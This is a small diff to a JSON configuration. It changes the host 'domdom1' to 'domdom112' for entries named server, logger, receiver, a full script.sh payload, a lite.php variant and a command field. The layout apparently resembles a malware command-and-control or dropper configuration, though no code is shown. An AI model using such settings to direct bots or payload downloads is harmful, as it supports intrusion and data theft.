@@ -1,8 +1,8 @@
 {
-"server": "https://domdom1",
-"logger": "https://domdom1/log.php",
-"reciever": "https://domdom1/recieve.php",
-"full": "https://domdom1/script.sh",
-"lite": "https://domdom1/lite.php",
+"server": "https://domdom112",
+"logger": "https://domdom112/log.php",
+"reciever": "https://domdom112/recieve.php",
+"full": "https://domdom112/script.sh",
+"lite": "https://domdom112/lite.php",
 "command": "command"
 }
